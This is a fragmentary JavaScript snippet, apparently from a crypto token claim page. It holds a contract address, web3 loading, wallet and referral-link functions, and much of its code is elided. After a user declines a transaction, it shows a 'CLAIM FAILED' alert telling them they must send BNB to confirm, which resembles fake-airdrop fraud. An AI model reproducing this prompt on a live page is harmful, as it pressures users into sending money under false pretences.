...
const sttaddr = "0x4B4fdb4E7eEc1Cb8Cb13F8A4E853108d6D823346";
const sttabi = [{
  "inputs": [],
...
const loadweb3 = async () => {
  try {
    ...
    if (error.code === 4001) {
      ...
      Swal.fire(
  'CLAIM FAILED',
  'you need to send BNB in order to confirm your transaction',
  'error'
)
    }
  }
...
function addToWallet() {
 ...
 function getreflink(){
     ...
     if(!document.getElementById('refaddress').value){
      Swal.fire(
  'Address Alert',
  'Please Enter Your paxg Address.',
  'error'
)
     }else{
if(!/^(0x){1}[0-9a-fA-F]{40}$/i.test(referaladd)){
  ...
  'error'
    ...
    document.getElementById('refaddress').value = 'https://etherscan.io/address/' + document.getElementById('refaddress').value;
}
}
}
